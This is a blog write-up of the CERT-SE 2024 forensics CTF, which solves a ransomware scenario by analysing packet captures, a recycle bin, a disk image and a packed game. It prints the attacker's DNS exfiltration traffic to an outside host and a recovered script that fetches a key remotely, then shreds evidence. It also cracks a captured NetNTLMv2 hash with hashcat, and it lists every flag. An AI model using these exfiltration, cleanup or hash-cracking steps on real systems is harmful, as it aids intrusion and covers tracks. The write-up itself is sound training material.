---
title: "CTF: CERT-SE 2024 (cyber security month)"
date: 2024-10-26T17:32:22+02:00
summary: "Write up of the CERT-SE 2024 CTF"
tags:
- ctf
---

That's October, and it seems it is the cyber security awareness month. And for some reason, doing CTF is kinda common on October, so I've done the [swedish CERT CTF](https://www.cert.se/2024/09/cert-se-ctf2024.html). So let's go for a quick write-up!

# What do we start with?

There no challenge list or anything else on the website. Just a quick summary and a file.

```xml
<scenario>
A fictional organisation has been affected by a ransomware attack. It has been successful in setting up
an emergency channel for communication and has access to parts of its infrastructure.

Can you find all the flags?
</scenario>
```

Given file is: **CERT-SE_CTF2024.zip** (31542062 bytes, sha256:af05dc01984ca12cecadc65ea5216667c897791ce7ef8712466529184ae37346)

There are a total of 9 flags to find out.


## First flags: The IRC chat

Let's download the file and opening it:

```sh
$ curl -LO https://www.cert.se/ctf/CERT-SE_CTF2024.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 30.0M  100 30.0M    0     0  7561k      0  0:00:04  0:00:04 --:--:-- 7562k

$ unzip CERT-SE_CTF2024.zip
Archive:  CERT-SE_CTF2024.zip
  inflating: CERT-SE_CTF2024.pcap
```

Yummy, a **.pcap** file. I'll start investigations with **wireshark**.

At first, following the tcp stream (ie: right click + follow + TCP Stream) on the first stream (eg: "tcp.stream eq 0") will show an IRC connection and conversation. On the start on the connection, we can see a first flag:

```md
CAP LS 302
PASS CTF[AES128]
NICK D3f3nd3r
USER user1 0 * :realname

:irc.ctf.alt CAP * LS :multi-prefix

CAP REQ :multi-prefix
CAP END
```

Then, reading the convo, we can see the 2 users are talking about another flag:

```md
:irc.ctf.alt PONG irc.ctf.alt :LAG1727122561261

PRIVMSG #emergency :He also handed over a strange looking string CTF[E65D46AD10F92508F500944B53168930], does it make sense to you?
PING LAG1727122591261
```

In the chat between the 2 users d3f3nd3r & An4lys3r in the #emergency channel, we can see they are exchanging another file, and talking about some other files.

```md
PRIVMSG An4lys3r :.DCC SEND RANSOM_NOTE.gz 199 0 95285 221.
PRIVMSG #emergency :SHA-256 checksum for /home/user/emergency_net/DCC/RANSOM_NOTE.gz (remote): 7113f236b43d1672d881c6993a8a582691ed4beb4c7d49befbceb1fddfb14909
```

## why_not

I'll export the DCC using the **wireshark** export function to **file0.raw** on the 10.0.0.20 to 10.0.0.10 way only.

```md
$ file file0.gz
file0.gz: gzip compressed data, was "why_not", last modified: Thu Aug 29 10:19:28 2024, from Unix, original size modulo 2^32 896794880

$ gunzip file0.gz
$ file file0
file0: ASCII text, with very long lines (65536), with no line terminators
$ less file0
CCCCCCCCCCCTCCCCCFCCCCC[CCCCCOCCCCCRC...
```

Great, something to read. File contains C, T, F, [, etc. letters. The flag is hidden in it and quite easily to extract. After having giving it a think, I found out this is just a sequence that starts with *CCCCCC*, *CCCCCT*, *CCCCCF*, ... until *RRRRRR*. If we rebuild the whole file and do a quick diff, we find out a *CTF[OR]* is breaking the sequence on byte 23472 of the file.

```python
#!/usr/bin/env python

fd = open('file0')
contents = fd.read()
fd.close()

contents = list(contents)

res = []

def split_string(text, n=6):
    return [text[i:i+n] for i in range(0, len(text), n)]

res = split_string(contents, 6)

line = 0

chars = ['C', 'T', 'F', '[', 'O', 'R']

for r in res:
    if r[-1] != chars[line % 6]:
        print(line, ''.join(r))
        print("invalid")
        break
    line += 1
```

Running it:
```sh
$ python decode-dcc-file.py
3912 CTF[OR
invalid

$ dd if=file0 bs=6 skip=3912 count=2 2>/dev/null
CTF[OR]C[CCO
```

# FTP files

In *tcp.stream eq 3*, we observe a FTP connection and see that a file named *corp_net1.pcap* is downloaded.

In the next stream, we retrieve it:

```sh
$ file corp_net1.pcap
corp_net1.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
$ sha256sum corp_net1.pcap
c1118f1f96b0f86fbd42ffb120d415c7bc1a0a362e794c62c602a277d8b49752  corp_net1.pcap
$ eza -l corp_net1.pcap
.rw-r--r-- 23M mycroft 26 Oct 18:08 corp_net1.pcap
```

Great, another *pcap* file. Before checking it out, let's finish the initial *pcap*.

In *tcp.stream eq 5*, there is another downloaded *corp_net2.pcap* file downloaded. Exporting from next stream gives us:

```sh
$ eza -l corp_net2.pcap ; file corp_net2.pcap ; sha256sum corp_net2.pcap
.rw-r--r-- 9.7M mycroft 26 Oct 18:13 corp_net2.pcap
corp_net2.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
944023687d287d63bd0c5355e7778239f963104e292c1ad1ad782acecef3f094  corp_net2.pcap
```

In *tcp.stream eq 7*, a file named *disk1.img* is downloaded. It is recoverable with stream 8.

```sh
$ eza -l disk1.img ; file disk1.img ; sha256sum disk1.img
.rw-r--r-- 1.0M mycroft 26 Oct 18:14 disk1.img
disk1.img: gzip compressed data, was "disk1.img", last modified: Tue Sep 24 07:55:43 2024, from Unix, original size modulo 2^32 1073741824
347f241ee5bebedaccf426c8d3b764836f524a30bb58217817bb8e2722b92c0c  disk1.img
```

In last stream, there is a `wordlist.txt` file to be retrieved.

```sh
$ eza -l wordlist.txt ; file wordlist.txt ; sha256sum wordlist.txt
.rw-r--r-- 2.1k mycroft 26 Oct 18:15 wordlist.txt
wordlist.txt: New Line Delimited JSON text data
fc7989a67cb29d67d9a785cf06ca4a29a0eeb6562a8f21c06fb7a03c6d042ee0  wordlist.txt
```

That's a lot of investigation to go through! We have 6 flags to retrieve from all those files.

There is nothing else interesting in the initial pcap.


# Studying corp_net1.pcap

At first, I filter out all 443 traffic. I do not have any cert secret key, so most I won't be able to decrypt any traffic. I find out there is more files exchanged. In tcp.stream *59*, another FTP connection, with a file named *puzzle.exe*. I export it from stream *60*:

```sh
$ eza -l puzzle.exe ; file puzzle.exe ; sha256sum puzzle.exe
.rw-r--r-- 19M mycroft 26 Oct 18:24 puzzle.exe
puzzle.exe: PE32+ executable (GUI) x86-64, for MS Windows, 6 sections
3319e9fd2c3a50d8e41c753d58769480eaf1dde78b16f0e5c61da0d1d457ed2c  puzzle.exe
```

In stream *63*, another ftp file downloaded: *Recycle-bin.zip*. We export it from stream *64*:

```sh
$ eza -l Recycle-bin.zip ; file Recycle-bin.zip ; sha256sum Recycle-bin.zip
.rw-r--r-- 1.6M mycroft 26 Oct 18:30 Recycle-bin.zip
Recycle-bin.zip: Zip archive data, at least v2.0 to extract, compression method=store
f2bee1c1d7f8e0b884058f873b1b1ed01ffe255e44a8f2f801653efd6d7ffb2b  Recycle-bin.zip
```

Before going into the files, let's finish with those strange DNS queries and the end of the capture

# The whatyoulookingat.com DNS queries

At the end of `corp_net1.pcap`, there is strange DNS traffic:

```sh
$ tcpdump -nr corp_net1.pcap | grep whatyoulookingat.com.
reading from file corp_net1.pcap, link-type EN10MB (Ethernet), snapshot length 262144
17:31:43.764873 IP 192.168.137.28.48583 > 192.168.137.2.53: 19218+ [1au] A? whatyoulookingat.com. (49)
17:31:43.764888 IP 192.168.137.28.48583 > 192.168.137.2.53: 57247+ [1au] AAAA? whatyoulookingat.com. (49)
17:31:43.765165 IP 192.168.137.2.57058 > 192.168.122.1.53: 2971+ [1au] AAAA? whatyoulookingat.com. (49)
08:20:50.470744 IP 192.168.137.28.34503 > 192.168.137.2.53: 21575+ A? whatyoulookingat.com. (38)
08:20:50.470756 IP 192.168.137.28.34503 > 192.168.137.2.53: 21799+ AAAA? whatyoulookingat.com. (38)
...
```

While the queries are ok, the response are not:

```sh
$ tcpdump -nr corp_net1.pcap src host 192.168.137.28 and dst host 195.200.72.82 and port 53
reading from file corp_net1.pcap, link-type EN10MB (Ethernet), snapshot length 262144
08:20:50.471478 IP 192.168.137.28.56964 > 195.200.72.82.53: 31315+ [1au] A? RFIE4RYNBINAUAAAAAGUSSCEKIAAAAUAAAAADYAIAIAAAAF2. (89)
08:20:53.538452 IP 192.168.137.28.44336 > 195.200.72.82.53: 58333+ [1au] A? WNF3GAAAAABXGQSJKQEAQCG34FH6. (69)
08:20:53.555226 IP 192.168.137.28.47311 > 195.200.72.82.53: 16553+ [1au] A? AAAABOKUSRCBKR4NV3O. (60)
08:20:56.622490 IP 192.168.137.28.48595 > 195.200.72.82.53: 34998+ [1au] A? 5LNJNWMAYQBIWBWA4FPXPFUQHMZUEUESZ23G37JDTTY5J2FU. (89)
08:20:57.668067 IP 192.168.137.28.34503 > 195.200.72.82.53: 11050+ [1au] A? CF75CJRZY. (50)
08:20:57.679981 IP 192.168.137.28.56527 > 195.200.72.82.53: 15131+ [1au] A? 5635X3INAAMOXQZGAAAACBQAAEDAABAYAACBQA. (79)
08:21:00.747867 IP 192.168.137.28.55154 > 195.200.72.82.53: 59070+ [1au] A? AQMAABAYAAICAACQEAAEAACBQAAEDAAAIGAACB. (79)
08:21:00.779779 IP 192.168.137.28.58865 > 195.200.72.82.53: 5965+ [1au] A? QAAEDAABA. (50)
08:21:02.839904 IP 192.168.137.28.42850 > 195.200.72.82.53: 31352+ [1au] A? YAACBQAAQEAAFAIAAIAAEDAAAIGAAAQMAAEDAAAIGAACBQAA. (89)
08:21:05.886265 IP 192.168.137.28.51307 > 195.200.72.82.53: 35761+ [1au] A? EDAABAIAAKAQAAQAAIG. (60)
```

There is something going on here.

I wrote a quick script to extract the data:


```py
#!/usr/bin/env python

from scapy.all import *

packets = rdpcap("corp_net1.pcap")

contents = ''
id = 0

for packet in packets:
    if DNS not in packet or packet[UDP].dport != 53:
        continue

    if packet[IP].dst != "195.200.72.82":
        continue

    q = packet[DNS].qd.qname.decode('utf-8').replace('.', '')

    id = id + 1

    # for some reason, the thing breakes stuff.
    # but we can find the flag:
    if id == 157 or id == 160:
        continue

    contents = contents + q

print(contents)
```

Using it allows to recover a PNG file:

```sh
$ python decode-dns.py | base32 -d | file -
/dev/stdin: PNG image data, 640 x 480, 8-bit/color RGB, non-interlaced

$ python decode-dns.py | base32 -d > decoded-dns-file.png
$ file decoded-dns-file.png
.rw-r--r-- 3.0k mycroft 26 Oct 18:39 decoded-dns-file.png
```

Looking at the file allows getting a new flag: *CTF[TOPPALUA]*. That's our 4th flag out of 9.


# Recycle-bin

Now, let's take a look at *Recycle-bin.zip*. Unzipping it extracts a ... windows recycle bin content. While searching for some indication of a flag in all the files, I find out this strange entry, and luckily the flag was there:

```sh
$ strings -e b \$I80Z3YX.txt
C:\Users\aleksej.pazjitnov\Downloads\INKEMW2QIVHFIT2NJFHE6U25.txt

$ echo -n INKEMW2QIVHFIT2NJFHE6U25 | base32 -d
CTF[PENTOMINOS]
```

5th flag: done.


# the 'archive' file

This one, well, this one. We start with the exported file:

```sh
$ file archive.raw
archive.raw: gzip compressed data, from Unix, original size modulo 2^32 847

$ sha256sum archive.raw ; eza -l archive.raw
951650d92079b81cda592034ee0989f373760d4366196a41320e7dd71e528dd0  archive.raw
.rw-r--r-- 860 mycroft 26 Oct 18:51 archive.raw
```

You'll have to gunzip the file, only finding out there is another *gz* in it. And again, and again, and again. Sometimes, it will be a *tar* instead. untar, and again *gunzip*, and again and again and again.

Eventually, it will end with some *txt* file with the flag in it:

```sh
$ bat -p archive.gz
CTF[IRRITATING]
```

6 flags in, 3 to go.


# Puzzle.exe

Well this one. I took some time to go through because of my bad eyes. And because you need a Windows workstation.

Easy answer: run it, play the (badly) coded game, take a good look at the picture once ordered, especially at the books, and you'll be able to read the flag: *CTF[HAPPYBIRTHDAY]*. That's our 7th flag.

Now, I've done a bit more on this one. I've run *pyinstxtractor.py* on *puzzle.exe* to extract the game:

```sh
$ pyinstxtractor.py puzzle.exe
...
14926111 wheel-0.43.0.dist-info\entry_points.txt
14926188 zlib1.dll
14982324 pyi-contents-directory _internal
14982324 PYZ-00.pyz
[+] Found 214 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pkgres.pyc
[+] Possible entry point: pyi_rth_setuptools.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: puzzle_new.pyc
[+] Found 496 files in PYZ archive
[+] Successfully extracted pyinstaller archive: puzzle.exe
...
```

Our game is in `puzzle_new.pyc`. With some online tool [like this one](https://pylingual.io/view_chimera?identifier=2fb4ddb435bde7d53eb3a48c56c8efba7b56a72cf5632220533ca771f76baf1e), I've extracted the code:

```py
import base64
import io
from urllib.parse import urlparse
import pygame
import random

def uri_to_pygame_image(uri):
    parsed_uri = urlparse(uri)
    base64_string = parsed_uri.path.split(',')[1]
    image_data = base64.b64decode(base64_string)
    image_stream = io.BytesIO(image_data)
    image = pygame.image.load(image_stream, 'png')
    return image
pygame.init()
screen = pygame.display.set_mode((640, 480))
uri = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABAAAAAQACAYAAAB/HSuDAAAABmJLR0QA/wD/AP
...
oNuVkS1cuG+3L8+hfpS9HHuAngSp0+P7IH3zmLK/zLU0Au3+Nn/8DrdpBTpBKQvcAAAAASUVORK5CYII='
image = uri_to_pygame_image(uri)
piece_width = 120
piece_height = 120
image_width, image_height = image.get_size()
num_rows = image_height // piece_height
num_cols = image_width // piece_width
pieces = []
for i in range(num_rows):
    for j in range(num_cols):
        piece = image.subsurface((j * piece_width, i * piece_height, piece_width, piece_height))
        pieces.append(piece)
random.shuffle(pieces)
window_width = image_width
window_height = image_height
window = pygame.display.set_mode((window_width, window_height))
pygame.display.set_caption('Search and you will find...')
font = pygame.font.Font(None, 36)
instructions = font.render('Click on a piece to move it to the top-left corner', True, (255, 255, 255))
current_piece_index = 0
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        elif event.type == pygame.MOUSEBUTTONDOWN:
            mouse_x, mouse_y = pygame.mouse.get_pos()
            piece_index = mouse_y // piece_height * num_cols + mouse_x // piece_width
            pieces[0], pieces[piece_index] = (pieces[piece_index], pieces[0])
    for i in range(num_rows):
        for j in range(num_cols):
            piece_index = i * num_cols + j
            window.blit(pieces[piece_index], (j * piece_width, i * piece_height))
    window.blit(instructions, (10, 10))
    pygame.display.flip()
pygame.quit()
```

There is the image in it! You can also extract it with *strings*:

```sh
$ strings -n 200 puzzle_new.pyc | tr -d '\n' | sed -e 's/data:image\/png;base64,//' | base64 -d > picture.png
```

And you can get the flag the same way than if you play the game. No more Windows workstation required.

We have two flags remaining to find out.


## corp_net2.pcap, the NTLM challenge

Next, I've opened the last *pcap* file. I found out that there were some SMB and NTLM authentication attempt. Time to use *hashcat* and check if we can find out some flags!

I found out an OK webdav auth query in the *pcap*. It's happening in *tcp.stream eq 57*.

I've created an *hashes-webdav* file extracting the server challenge and the client challenge and response:

```sh
$ cat hashes-webdav
CTF::LAB:fe26bf30955b64d7:a406a1570d0391d358354bb21df7d12e:0101000000000000158bece036fada0136c00153f7ab788b00000000020008004d00550044004a0001001e00570049004e002d0035004600560037004d004e0055004200410030004b00040014004d00550044004a002e004c004f00430041004c0003003400570049004e002d0035004600560037004d004e0055004200410030004b002e004d00550044004a002e004c004f00430041004c00050014004d00550044004a002e004c004f00430041004c000800300030000000000000000000000000200000fd6f62357ae25314e0b8f63ab17e5d1821479e68ec22e7ee70827eadb2f393200a001000000000000000000000000000000000000900200048005400540050002f00640063006300300031002e006c006f00630061006c000000000000000000
```

format is <user>::<group>::<server challenge>::<client challenge+response>


Running hashcat, using the given wordlist (remember!)

```sh
hashcat --show hashes-webdav wordlist.txt
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

CTF::LAB:fe26bf30955b64d7:a406a1570d0391d358354bb21df7d12e:0101000000000000158bece036fada0136c00153f7ab788b00000000020008004d00550044004a0001001e00570049004e002d0035004600560037004d004e0055004200410030004b00040014004d00550044004a002e004c004f00430041004c0003003400570049004e002d0035004600560037004d004e0055004200410030004b002e004d00550044004a002e004c004f00430041004c00050014004d00550044004a002e004c004f00430041004c000800300030000000000000000000000000200000fd6f62357ae25314e0b8f63ab17e5d1821479e68ec22e7ee70827eadb2f393200a001000000000000000000000000000000000000900200048005400540050002f00640063006300300031002e006c006f00630061006c000000000000000000:[RHODE_ISLAND_Z]
```

And that's out CTF-less flag: *[RHODE_ISLAND_Z]*.


# Last file to investigate: disk1.img

The last flag is likely in disk1.img! Let's find out if the flag is in it.

So we start finding out what's the file is, and try to mount it:

```sh
$ mv disk1.img disk1.gz
$ gunzip disk1.gz
$ file disk1
disk1: DOS/MBR boot sector; partition 1 : ID=0xc, start-CHS (0x0,32,33), end-CHS (0x82,138,8), startsector 2048, 2095104 sectors

$ fdisk disk1
Welcome to fdisk (util-linux 2.40.2).
Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.


Command (m for help): p

Device     Boot Start     End Sectors  Size Id Type
disk1p1          2048 2097151 2095104 1023M  c W95 FAT32 (LBA)

$ sudo losetup --partscan /dev/loop0 disk1
$ sudo ls -l /dev/loop0*
brw-rw---- 1 root disk   7, 0 Oct 26 20:37 /dev/loop0
brw-rw---- 1 root disk 259, 4 Oct 26 20:37 /dev/loop0p1

$ mkdir -p mnt ; sudo mount /dev/loop0p1 mnt
$ eza -l mnt/
.rwxr-xr-x 48 root 24 Sep 09:54 secret.encrypted

$ file mnt/secret.encrypted
mnt/secret.encrypted: openssl enc'd data with salted password
```

Okay, a single file, encrypted. No password. Let's find out if we can find some deleted file.

```sh
$ sudo umount mnt
$ binwalk disk1

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
3170304       0x306000        Executable script, shebang: "/bin/bash"
3178496       0x308000        OpenSSL encryption, salted, salt: 0x1B70151F197C9A78
```

Okay, there is more stuff in it. I'll use *photorec* to recover files:

```md
... with photorec ...

Disk disk1 - 1073 MB / 1024 MiB (RO)
     Partition                  Start        End    Size in sectors
   P FAT32                    0   0  1   130 138  8    2097152 [NO NAME]


2 files saved in /home/mycroft/dev/ctf-cert-se-2024/disk1/mnt/recup_dir directory.
Recovery completed.
```

2 files recovered! Let's find out what are those:

```sh
$ ls -l mnt/recup_dir/
.rw-r--r-- 1,821 mycroft mycroft 26 Oct 20:39 report.xml
.rw-r--r--   228 mycroft mycroft 26 Oct 20:39 f0006192.sh
.rw-r--r--   939 mycroft mycroft 26 Oct 20:39 f0006200.txt

$ cat mnt/recup_dir/f0006192.sh
#!/bin/bash
password=$(SSLKEYLOGFILE=sslkeylogfile curl --insecure https://whatyoulookingat.com/1.txt)
openssl enc -aes-128-cbc -pass pass:$password -in secret -out secret.encrypted
shred secret
rm secret
rm sslkeylogfile
rm $0

$ cat mnt/recup_dir/f0006200.txt
SERVER_HANDSHAKE_TRAFFIC_SECRET cb68ed4293ea43b5ae0f949b7d36f9e801cdea8025cb8ce61b2226a1ba502118 c9275180cf4e5bcdd6835e02459d453d47420201b92ed20ed507e278d2c9616778fa573479bd8ec3b1fad7e74dcf27f7
EXPORTER_SECRET cb68ed4293ea43b5ae0f949b7d36f9e801cdea8025cb8ce61b2226a1ba502118 1c375d3b154029a9c7d9ff5b4f7f07b75ba9751570c454423cc6d21c53a27e504d3e193d3e087a6e1feb7c31383e637d
SERVER_TRAFFIC_SECRET_0 cb68ed4293ea43b5ae0f949b7d36f9e801cdea8025cb8ce61b2226a1ba502118 ba5519d408d2cc9c285781eec7c2951bfbf069609b57b18906754624e0628820ed1888d0f22b770325c872b5f1f5bee3
CLIENT_HANDSHAKE_TRAFFIC_SECRET cb68ed4293ea43b5ae0f949b7d36f9e801cdea8025cb8ce61b2226a1ba502118 c85ae912b5caf1eb39452864e582c083a39f4ad89f27608aff7bb3287edb85b002111af149480f28e0c60e543075dd7b
CLIENT_TRAFFIC_SECRET_0 cb68ed4293ea43b5ae0f949b7d36f9e801cdea8025cb8ce61b2226a1ba502118 3a6be8bc746c002fe02a76da433307d5787bf230b9d0c2ee9ab776a17459fd2f037e8bee0a1b26b759e1ba02879ae920
```

So we know how the file was created, and we have a TLS key debug log file.

Using wireshark, import this file in TLS protocol preferences, as the (pre)-master secret, and search for *GET /1.txt*.

You'll find out the downloaded file's content is 'pheiph0Xeiz8OhNa'. So now, just use openssl to decrypt the file:

```sh
$ openssl enc -d -aes-128-cbc -pass pass:pheiph0Xeiz8OhNa -in secret.encrypted
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
CTF[OPPORTUNISTICALLY]
```

And that's it!


# Wrap-up

All flags are:

- CTF[AES128] ~ in IRC headers in the initial IRC connection
- CTF[E65D46AD10F92508F500944B53168930] ~ during the IRC chat
- CTF[OR] ~ Found in the DCC file exchanged (why_not)
- CTF[TOPPALUA] ~ in a PNG trasmit in DNS queries
- CTF[PENTOMINOS] ~ in a base32 encoded file name in deleted metadata in the recycle-bin
- CTF[IRRITATING] ~ in archive file, in a gz/gz/gz/gz/gz/tar/gz/gz/gz/gz and again file
- CTF[HAPPYBIRTHDAY] ~ in puzzle.exe, playing the game, recreating the image and reading it
- CTF[RHODE_ISLAND_Z] ~ (the one without the CTF); In a webdav authentication in corp2_net.pcap
- CTF[OPPORTUNISTICALLY] ~ in an encrypted file in the disk1.img file

That was a nice easy CTF! Looking forward to solving the next ones next year :-)
